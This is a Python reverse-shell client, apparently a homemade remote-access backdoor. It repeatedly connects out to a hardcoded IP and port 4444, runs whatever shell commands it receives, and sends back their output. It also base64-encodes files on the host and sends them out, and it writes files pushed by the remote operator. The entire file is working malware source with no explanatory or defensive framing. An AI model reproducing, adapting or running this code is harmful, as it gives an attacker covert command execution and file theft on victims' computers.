import socket
import os
import subprocess
import json
import base64
import time

# --- CONFIGURATION ---
SERVER_HOST = "10.55.139.133"  # change to your PC IP
SERVER_PORT = 4444
# ---------------------


def reliable_send(data):
    """Sends data as JSON for reliable transmission."""
    json_data = json.dumps(data)
    s.send(json_data.encode())


def reliable_recv():
    """Receives data and decodes it (JSON)."""
    data = b""
    while True:
        try:
            chunk = s.recv(4096)
            if not chunk:
                return None
            data += chunk
            return json.loads(data)
        except ValueError:
            continue


def execute_command(command):
    """Executes a system command and returns output as string."""
    try:
        return subprocess.check_output(
            command,
            shell=True,
            stderr=subprocess.STDOUT,
            text=True
        )
    except subprocess.CalledProcessError as e:
        return e.output
    except Exception as e:
        return f"[-] Error executing command: {str(e)}"


def change_working_directory(path):
    try:
        os.chdir(path)
        return "[+] Changing working directory to " + path
    except FileNotFoundError:
        return "[-] " + path + ": No such file or directory"
    except Exception as e:
        return f"[-] Error changing directory: {str(e)}"


def download_file(file_path):
    """Reads a file and returns a dict with base64 data."""
    try:
        with open(file_path, "rb") as f:
            content = f.read()
        b64_data = base64.b64encode(content).decode()
        return {
            "mode": "file",
            "filename": os.path.basename(file_path),
            "data": b64_data
        }
    except Exception as e:
        return {
            "mode": "error",
            "message": f"[-] Error downloading file: {str(e)}"
        }


def upload_file(file_path, content_bytes):
    """Writes content_bytes to a file."""
    try:
        with open(file_path, "wb") as f:
            f.write(content_bytes)
        return "[+] Successfully uploaded file."
    except Exception as e:
        return f"[-] Error uploading file: {str(e)}"


while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((SERVER_HOST, SERVER_PORT))

        while True:
            command = reliable_recv()
            if command is None:
                break

            # ---- handle dictionary-based commands (for upload) ----
            if isinstance(command, dict) and command.get("mode") == "upload":
                remote_path = command.get("path")
                b64_data = command.get("data")

                try:
                    content_bytes = base64.b64decode(b64_data.encode())
                    result = upload_file(remote_path, content_bytes)
                except Exception as e:
                    result = f"[-] Error decoding upload data: {str(e)}"

                reliable_send(result)
                continue

            # ---- handle string-based commands (normal shell, cd, download, exit) ----
            if not isinstance(command, str):
                reliable_send("[-] Invalid command type received on client.")
                continue

            if command == "exit":
                s.close()
                break

            elif command[:2] == "cd" and len(command) > 2:
                result = change_working_directory(command[3:])

            elif command.startswith("download "):
                file_path = command[9:]
                result = download_file(file_path)

            else:
                result = execute_command(command)

            reliable_send(result)

    except Exception as e:
        print(f"Connection error: {e}")
        time.sleep(10)